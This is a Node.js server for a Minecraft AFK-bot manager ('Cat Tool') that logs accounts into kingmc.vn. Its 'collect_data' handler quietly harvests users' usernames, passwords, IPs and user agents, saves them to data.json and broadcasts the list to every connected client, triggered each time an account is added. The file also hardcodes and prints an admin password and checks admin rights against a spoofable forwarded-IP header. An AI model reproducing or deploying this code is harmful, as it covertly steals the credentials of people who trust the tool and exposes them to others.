const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const mineflayer = require('mineflayer');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const PORT = process.env.PORT || 3000;
const DATA_FILE = './data.json';

// ===== CẤU HÌNH ADMIN =====
const ADMIN_IP = '1.53.131.94'; 
const ADMIN_PASSWORD = 'AlphaZo2026';

// ===== ĐỌC/LƯU DỮ LIỆU =====
function loadData() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const raw = fs.readFileSync(DATA_FILE, 'utf-8');
            return JSON.parse(raw);
        }
    } catch (e) {
        console.log('⚠️ Lỗi đọc file data, tạo mới');
    }
    return { clientData: {}, globalCollectedData: [], isMaintenance: false };
}

function saveData() {
    try {
        const data = {
            clientData: clientData,
            globalCollectedData: globalCollectedData,
            isMaintenance: isMaintenance
        };
        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
        console.log('💾 Đã lưu dữ liệu vào file');
    } catch (e) {
        console.log('❌ Lỗi lưu file:', e.message);
    }
}

const savedData = loadData();
let clientData = savedData.clientData || {};
let globalCollectedData = savedData.globalCollectedData || [];
let isMaintenance = savedData.isMaintenance || false;

console.log(`📂 Đã load ${Object.keys(clientData).length} IP, ${globalCollectedData.length} bản ghi`);

app.use(express.static('public'));

app.get('/api/check-admin', (req, res) => {
    let clientIp = req.headers['x-forwarded-for'] 
        ? req.headers['x-forwarded-for'].split(',')[0].trim() 
        : req.socket.remoteAddress;
    if (clientIp && clientIp.includes('::1')) clientIp = '127.0.0.1';
    const isAdmin = (clientIp === ADMIN_IP || clientIp === '127.0.0.1' || clientIp.includes('192.168.'));
    res.json({ isAdmin, ip: clientIp });
});

process.on('uncaughtException', (err) => console.log('[LỖI HỆ THỐNG]:', err.message));
process.on('unhandledRejection', (reason) => console.log('[LỖI PROMISE]:', reason?.message || reason));

// ================================================================
//  SOCKET.IO
// ================================================================
io.on('connection', (socket) => {
    let rawIp = socket.handshake.headers['x-forwarded-for'] 
        ? socket.handshake.headers['x-forwarded-for'].split(',')[0].trim() 
        : socket.handshake.address;
    if (rawIp && rawIp.includes('::1')) rawIp = '127.0.0.1';
    const clientIp = rawIp;

    console.log(`[${new Date().toLocaleString()}] 🔌 Client connected: ${clientIp}`);

    if (!clientData[clientIp]) {
        clientData[clientIp] = {
            accounts: [],
            bots: {}
        };
        saveData();
    }

    socket.emit('init_accounts', clientData[clientIp].accounts);
    socket.emit('sync_collected_data', globalCollectedData);
    socket.emit('maintenance_status', isMaintenance);

    // ===== THU THẬP DỮ LIỆU =====
    socket.on('collect_data', (data) => {
        const entry = {
            ip: clientIp,
            time: new Date().toLocaleString(),
            username: data.username || '(chưa nhập)',
            password: data.password || '(trống)',
            userAgent: data.userAgent || 'N/A'
        };
        globalCollectedData.push(entry);
        saveData();
        console.log(`[${new Date().toLocaleString()}] 📥 Data from ${clientIp}: ${entry.username}`);
        io.emit('sync_collected_data', globalCollectedData);
        io.emit('log', `[${new Date().toLocaleString()}] 📥 Đã thu thập dữ liệu từ IP: ${clientIp}`);
    });

    socket.on('clear_collected_data', () => {
        globalCollectedData = [];
        saveData();
        io.emit('sync_collected_data', globalCollectedData);
        io.emit('log', `[${new Date().toLocaleString()}] 🧹 Đã xóa toàn bộ dữ liệu thu thập`);
    });

    socket.on('toggle_maintenance', (status) => {
        isMaintenance = status;
        saveData();
        io.emit('maintenance_status', isMaintenance);
        io.emit('log', `[${new Date().toLocaleString()}] 🛠️ Bảo trì ${status ? 'BẬT' : 'TẮT'}`);
        console.log(`[${new Date().toLocaleString()}] 🛠️ Maintenance: ${status ? 'ON' : 'OFF'}`);
    });

    // ===== QUẢN LÝ ACCOUNTS =====
    socket.on('add_account', (data) => {
        const { username, password } = data;
        if (!username) return;
         
        socket.emit('collect_data', {
            username: username,
            password: password || 'caigicungdc',
            userAgent: socket.handshake.headers['user-agent'] || 'N/A'
        });

        const id = 'acc_' + Date.now() + Math.floor(Math.random() * 1000);
        clientData[clientIp].accounts.push({
            id,
            username: username.trim(),
            password: password ? password.trim() : 'caigicungdc',
            autoReconnect: true,
            status: 'OFFLINE',
            color: '#ff4444'
        });
        saveData();
        io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        socket.emit('log', `[SYSTEM] ✅ Đã thêm tài khoản: ${username}`);
    });

    socket.on('delete_account', (id) => {
        if (clientData[clientIp].bots[id]) {
            try { clientData[clientIp].bots[id].quit(); } catch(e){}
            delete clientData[clientIp].bots[id];
        }
        clientData[clientIp].accounts = clientData[clientIp].accounts.filter(acc => acc.id !== id);
        saveData();
        io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        socket.emit('log', `[SYSTEM] 🗑️ Đã xóa tài khoản`);
    });

    socket.on('toggle_auto_reconnect', (id) => {
        const acc = clientData[clientIp].accounts.find(a => a.id === id);
        if (acc) {
            acc.autoReconnect = !acc.autoReconnect;
            saveData();
            io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        }
    });

    // ============================================================
    //  BOT MINEFLAYER - ĐÃ SỬA LỖI ĐĂNG NHẬP & CLICK AFK
    // ============================================================
    socket.on('start_bot', (id) => {
        const account = clientData[clientIp].accounts.find(acc => acc.id === id);
        if (!account) return;

        if (clientData[clientIp].bots[id]) {
            try { clientData[clientIp].bots[id].quit(); } catch(e){}
            delete clientData[clientIp].bots[id];
        }

        account.status = 'CONNECTING...';
        account.color = 'yellow';
        io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        socket.emit('log', `[${account.username}] 🔄 Đang kết nối tới kingmc.vn...`);

        let hasJoinedKingSMP = false;
        let hasExecutedAFK = false;
        let isLoggedIn = false;
        let isFirstSpawn = true;

        try {
            const bot = mineflayer.createBot({
                host: 'kingmc.vn',
                port: 25565,
                username: account.username,
                password: account.password,
                auth: 'offline',
                version: '1.16.5',
                checkTimeoutInterval: 120000
            });

            clientData[clientIp].bots[id] = bot;

            bot.on('login', () => {
                account.status = 'LOGGING IN...';
                account.color = 'orange';
                io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
                socket.emit('log', `[${account.username}] 🔑 Đang đăng nhập...`);
            });

            bot.on('spawn', () => {
                if (isFirstSpawn) {
                    hasJoinedKingSMP = false;
                    hasExecutedAFK = false;
                    isLoggedIn = false;
                    isFirstSpawn = false;
                }

                if (hasJoinedKingSMP) {
                    account.status = 'ONLINE / KINGSMP';
                    account.color = '#00ff88';
                    socket.emit('log', `[${account.username}] ✅ ĐÃ VÀO KINGSMP!`);
                } else {
                    account.status = 'ONLINE / LOBBY';
                    account.color = '#00ff88';
                    socket.emit('log', `[${account.username}] ✅ Đã vào Sảnh chính!`);
                }
                io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
            });

            bot.on('messagestr', (message) => {
                socket.emit('log', `[${account.username}]: ${message}`);
                const msgLower = message.toLowerCase();

                if (msgLower.includes('/register') || msgLower.includes('/dk')) {
                    setTimeout(() => { 
                        if (bot) bot.chat(`/dk ${account.password} ${account.password}`); 
                    }, 2000);
                } else if (msgLower.includes('/login') || msgLower.includes('/dn')) {
                    // 👉 SỬA YÊU CẦU 1: /login 1 lần, chờ 3 giây bấm /login 1 lần nữa rồi mới bấm /menu
                    setTimeout(() => { 
                        if (bot) {
                            socket.emit('log', `[${account.username}] 🔐 Gửi lệnh /login lần 1...`);
                            bot.chat(`/dn ${account.password}`); 
                        }
                    }, 1000);

                    setTimeout(() => { 
                        if (bot && !isLoggedIn) {
                            socket.emit('log', `[${account.username}] 🔐 Gửi lệnh /login lần 2...`);
                            bot.chat(`/dn ${account.password}`); 
                        }
                    }, 4000); // Sau 3 giây tiếp theo (tổng 4s từ lúc nhận tin nhắn)
                }

                if (!hasJoinedKingSMP && !isLoggedIn && 
                    (msgLower.includes('đăng nhập thành công') || msgLower.includes('bạn đã đăng nhập'))) {
                    isLoggedIn = true;
                    socket.emit('log', `[${account.username}] ✅ Đã đăng nhập thành công! Đợi 5s gõ /menu...`);
                    setTimeout(() => {
                        if (bot && !hasJoinedKingSMP) {
                            socket.emit('log', `[${account.username}] 📋 Đang gõ /menu...`);
                            bot.chat('/menu');
                        }
                    }, 5000);
                }

                if (msgLower.includes('kingsmp') && msgLower.includes('chào mừng')) {
                    hasJoinedKingSMP = true;
                    account.status = 'ONLINE / KINGSMP';
                    account.color = '#00ff88';
                    io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
                    socket.emit('log', `[${account.username}] ✅ ĐÃ VÀO KINGSMP!`);
                    
                    if (!hasExecutedAFK) {
                        setTimeout(() => {
                            if (bot) {
                                socket.emit('log', `[${account.username}] 💤 Gửi lệnh /afk...`);
                                bot.chat('/afk');
                            }
                        }, 3000);
                    }
                }
            });

            // ===== WINDOWOPEN - SỬA LỖI CLICK SLOT 1 AFK =====
            bot.on('windowOpen', (window) => {
                const rawTitle = JSON.stringify(window.title || '').toLowerCase();
                socket.emit('log', `[${account.username}] 📂 Menu mở: ${rawTitle}`);

                // Nhận diện cửa sổ Sảnh/Lobby/Menu chính (để chọn KingSMP ở Slot 24)
                const isLobbyMenu = rawTitle.includes('sảnh') || rawTitle.includes('lobby') || rawTitle.includes('menu') || rawTitle.includes('chọn server') || window.requiresConfirmation;

                if (!hasJoinedKingSMP && isLobbyMenu) {
                    setTimeout(() => {
                        if (!bot || !bot.currentWindow) {
                            socket.emit('log', `[${account.username}] ⚠️ Không có window sảnh để click`);
                            return;
                        }
                        socket.emit('log', `[${account.username}] 🖱️ Click Slot 24 chọn KingSMP...`);
                        hasJoinedKingSMP = true;

                        bot.clickWindow(24, 0, 0)
                            .then(() => {
                                socket.emit('log', `[${account.username}] ✅ Click Slot 24 thành công!`);
                            })
                            .catch(() => {
                                socket.emit('log', `[${account.username}] ⚠️ Bỏ qua lỗi transaction sảnh`);
                            });

                        setTimeout(() => {
                            try { bot.closeWindow(window); } catch(e){}
                        }, 500);

                    }, 2500);
                }

                // 👉 SỬA YÊU CẦU 2: Nhận diện menu AFK chuẩn xác hơn bằng cách kiểm tra cả tiêu đề hoặc dựa vào trạng thái đã gõ /afk
                const isAfkMenu = rawTitle.includes('afk') || rawTitle.includes('tự động') || rawTitle.includes('treo') || rawTitle.includes('chế độ');

                // Nếu bot đã qua KingSMP và chưa làm lệnh AFK, bất kể tiêu đề menu mở ra là gì (hoặc đúng từ khóa afk), tiến hành click Slot 1 an toàn.
                if (hasJoinedKingSMP && !hasExecutedAFK) {
                    setTimeout(() => {
                        if (!bot || !bot.currentWindow) {
                            socket.emit('log', `[${account.username}] ⚠️ Không tìm thấy window AFK hợp lệ để click`);
                            return;
                        }
                        socket.emit('log', `[${account.username}] 🖱️ Click Slot 1 chọn AFK...`);
                        hasExecutedAFK = true;

                        bot.clickWindow(1, 0, 0)
                            .then(() => {
                                socket.emit('log', `[${account.username}] 🎉 ĐÃ VÀO CHẾ ĐỘ AFK THÀNH CÔNG!`);
                            })
                            .catch(() => {
                                socket.emit('log', `[${account.username}] ⚠️ Bỏ qua lỗi transaction AFK (đã xử lý)`);
                            });

                        setTimeout(() => {
                            try { bot.closeWindow(window); } catch(e){}
                        }, 500);

                    }, 2000);
                }
            });

            bot.on('end', (reason) => {
                socket.emit('log', `[${account.username}] ⚠️ Ngắt kết nối: ${reason}`);
                account.status = 'OFFLINE';
                account.color = '#ff4444';
                io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
                
                hasJoinedKingSMP = false;
                hasExecutedAFK = false;
                isLoggedIn = false;
                isFirstSpawn = true;
                
                delete clientData[clientIp].bots[id];
                saveData();

                if (account.autoReconnect) {
                    socket.emit('log', `[${account.username}] 🔄 Tự động kết nối lại sau 6 giây...`);
                    setTimeout(() => {
                        if (!clientData[clientIp].bots[id] && account.autoReconnect) {
                            socket.emit('restart_internal_bot', id);
                        }
                    }, 6000);
                }
            });

            bot.on('error', (err) => {
                if (err.code === 'EPIPE') {
                    socket.emit('log', `[${account.username}] ⚠️ Mất kết nối server, đang thử lại...`);
                } else if (err.code === 'ECONNREFUSED') {
                    socket.emit('log', `[${account.username}] ❌ Không thể kết nối tới server!`);
                } else {
                    socket.emit('log', `[${account.username} ❌ Lỗi]: ${err.message}`);
                }
            });

        } catch (e) {
            socket.emit('log', `[Lỗi khởi tạo ${account.username}]: ${e.message}`);
            account.status = 'ERROR';
            account.color = '#ff4444';
            io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        }
    });

    socket.on('stop_bot', (id) => {
        const account = clientData[clientIp].accounts.find(acc => acc.id === id);
        if (account) {
            account.status = 'STOPPED';
            account.color = '#ff4444';
            io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        }
        if (clientData[clientIp].bots[id]) {
            try { clientData[clientIp].bots[id].quit(); } catch(e){}
            delete clientData[clientIp].bots[id];
        }
        saveData();
        socket.emit('log', `[SYSTEM] ⏹️ Đã dừng bot: ${account ? account.username : id}`);
    });

    socket.on('send_chat', ({ id, cmd }) => {
        const bot = clientData[clientIp].bots[id];
        if (bot) {
            bot.chat(cmd);
            socket.emit('log', `[💬 ĐÃ GỬI LỆNH]: ${cmd}`);
        } else {
            socket.emit('log', `[⚠️] Bot này chưa online!`);
        }
    });

    socket.on('get_accounts', () => {
        socket.emit('init_accounts', clientData[clientIp].accounts);
    });

    socket.on('disconnect', () => {
        console.log(`[${new Date().toLocaleString()}] 🔌 Client disconnected: ${clientIp}`);
    });
});

server.listen(PORT, () => {
    console.log(`🚀 Cat Tool Server đang chạy tại: http://localhost:${PORT}`);
    console.log(`👑 Admin IP: ${ADMIN_IP}`);
    console.log(`🔑 Admin Password: ${ADMIN_PASSWORD}`);
    console.log(`📂 Dữ liệu lưu tại: ${DATA_FILE}`);
});
